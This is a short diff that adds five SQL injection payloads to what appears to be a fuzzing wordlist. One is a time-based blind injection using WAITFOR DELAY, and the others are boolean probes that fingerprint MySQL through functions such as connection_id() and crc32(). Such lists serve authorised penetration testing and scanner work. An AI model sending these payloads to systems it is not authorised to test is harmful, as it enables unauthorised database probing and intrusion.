@@ -1,0 +1,5 @@
+1' WAITFOR DELAY '0:0:10'
+conv('a',16,2)=conv('a',16,2)
+connection_id()=connection_id()
+crc32('MySQL')=crc32('MySQL')
+POW(1,1)
